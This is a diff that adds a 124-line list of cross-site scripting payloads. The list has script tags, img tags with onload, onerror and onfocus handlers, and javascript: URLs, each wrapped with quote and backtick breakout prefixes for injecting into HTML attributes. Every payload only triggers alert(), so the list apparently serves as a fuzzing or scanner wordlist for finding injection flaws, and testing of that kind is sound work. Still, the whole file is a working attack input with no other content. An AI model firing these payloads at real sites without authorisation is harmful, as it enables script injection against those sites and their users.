@@ -1,0 +1,124 @@
+alert()
+alert;throw 1
+javascript:alert()
+javascript:alert;throw 1
+ onload=alert()
+" onload="alert()
+' onload='alert()
+` onload=`alert()
+ onerror=alert()
+" onerror="alert()
+' onerror='alert()
+` onerror=`alert()
+ autofocus onfocus=alert()
+" autofocus onfocus="alert()
+' autofocus onfocus='alert()
+` autofocus onfocus=`alert()
+ onload=alert;throw 1
+" onload="alert;throw 1
+' onload='alert;throw 1
+` onload=`alert;throw 1
+ onerror=alert;throw 1
+" onerror="alert;throw 1
+' onerror='alert;throw 1
+` onerror=`alert;throw 1
+ autofocus onfocus=alert;throw 1
+" autofocus onfocus="alert;throw 1
+' autofocus onfocus='alert;throw 1
+` autofocus onfocus=`alert;throw 1
+<script>alert()</script>
+><script>alert()</script><a href=
+"<script>alert()</script>"
+"><script>alert()</script><a href="
+'<script>alert()</script>'
+'><script>alert()</script><a href='
+`<script>alert()</script>`
+`><script>alert()</script><a href=`
+<script>alert;throw 1</script>
+><script>alert;throw 1</script><a href=
+"<script>alert;throw 1</script>"
+"><script>alert;throw 1</script><a href="
+'<script>alert;throw 1</script>'
+'><script>alert;throw 1</script><a href='
+`<script>alert;throw 1</script>`
+`><script>alert;throw 1</script><a href=`
+<img src=1 onload=alert()>
+><img src=1 onload=alert()><a href=
+"<img src=1 onload=alert()>"
+"><img src=1 onload=alert()><a href="
+'<img src=1 onload=alert()>'
+'><img src=1 onload=alert()><a href='
+`<img src=1 onload=alert()>`
+`><img src=1 onload=alert()><a href=`
+<img src=1 onerror=alert()>
+><img src=1 onerror=alert()><a href=
+"<img src=1 onerror=alert()>"
+"><img src=1 onerror=alert()><a href="
+'<img src=1 onerror=alert()>'
+'><img src=1 onerror=alert()><a href='
+`<img src=1 onerror=alert()>`
+`><img src=1 onerror=alert()><a href=`
+<img src=1 autofocus onfocus=alert()>
+><img src=1 autofocus onfocus=alert()><a href=
+"<img src=1 autofocus onfocus=alert()>"
+"><img src=1 autofocus onfocus=alert()><a href="
+'<img src=1 autofocus onfocus=alert()>'
+'><img src=1 autofocus onfocus=alert()><a href='
+`<img src=1 autofocus onfocus=alert()>`
+`><img src=1 autofocus onfocus=alert()><a href=`
+<img src=1 onload=alert;throw 1>
+><img src=1 onload=alert;throw 1><a href=
+"<img src=1 onload=alert;throw 1>"
+"><img src=1 onload=alert;throw 1><a href="
+'<img src=1 onload=alert;throw 1>'
+'><img src=1 onload=alert;throw 1><a href='
+`<img src=1 onload=alert;throw 1>`
+`><img src=1 onload=alert;throw 1><a href=`
+<img src=1 onerror=alert;throw 1>
+><img src=1 onerror=alert;throw 1><a href=
+"<img src=1 onerror=alert;throw 1>"
+"><img src=1 onerror=alert;throw 1><a href="
+'<img src=1 onerror=alert;throw 1>'
+'><img src=1 onerror=alert;throw 1><a href='
+`<img src=1 onerror=alert;throw 1>`
+`><img src=1 onerror=alert;throw 1><a href=`
+<img src=1 autofocus onfocus=alert;throw 1>
+><img src=1 autofocus onfocus=alert;throw 1><a href=
+"<img src=1 autofocus onfocus=alert;throw 1>"
+"><img src=1 autofocus onfocus=alert;throw 1><a href="
+'<img src=1 autofocus onfocus=alert;throw 1>'
+'><img src=1 autofocus onfocus=alert;throw 1><a href='
+`<img src=1 autofocus onfocus=alert;throw 1>`
+`><img src=1 autofocus onfocus=alert;throw 1><a href=`
+<img src="javascript:alert()">
+><img src="javascript:alert()"><a href=
+"<img src="javascript:alert()">"
+"><img src="javascript:alert()"><a href="
+'<img src="javascript:alert()">'
+'><img src="javascript:alert()"><a href='
+`<img src="javascript:alert()">`
+`><img src="javascript:alert()"><a href=`
+<img src="javascript:alert;throw 1">
+><img src="javascript:alert;throw 1"><a href=
+"<img src="javascript:alert;throw 1">"
+"><img src="javascript:alert;throw 1"><a href="
+'<img src="javascript:alert;throw 1">'
+'><img src="javascript:alert;throw 1"><a href='
+`<img src="javascript:alert;throw 1">`
+`><img src="javascript:alert;throw 1"><a href=`
+<a href="javascript:alert()">
+><a href="javascript:alert()"><a href=
+"<a href="javascript:alert()">"
+"><a href="javascript:alert()"><a href="
+'<a href="javascript:alert()">'
+'><a href="javascript:alert()"><a href='
+`<a href="javascript:alert()">`
+`><a href="javascript:alert()"><a href=`
+<a href="javascript:alert;throw 1">
+><a href="javascript:alert;throw 1"><a href=
+"<a href="javascript:alert;throw 1">"
+"><a href="javascript:alert;throw 1"><a href="
+'<a href="javascript:alert;throw 1">'
+'><a href="javascript:alert;throw 1"><a href='
+`<a href="javascript:alert;throw 1">`
+`><a href="javascript:alert;throw 1"><a href=`
